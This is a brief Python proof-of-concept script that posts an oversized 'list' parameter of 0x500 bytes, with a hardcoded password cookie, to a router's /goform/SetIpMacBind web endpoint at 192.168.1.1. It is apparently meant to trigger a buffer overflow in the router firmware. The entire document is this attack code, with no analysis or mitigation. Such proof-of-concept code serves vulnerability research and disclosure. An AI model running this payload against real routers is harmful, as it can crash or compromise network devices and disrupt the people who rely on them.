import requests
def send_payload(url, payload):
    params={
            'bindnum':b'10',
            'list':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500
url="http://192.168.1.1/goform/SetIpMacBind"
send_payload(url, payload)   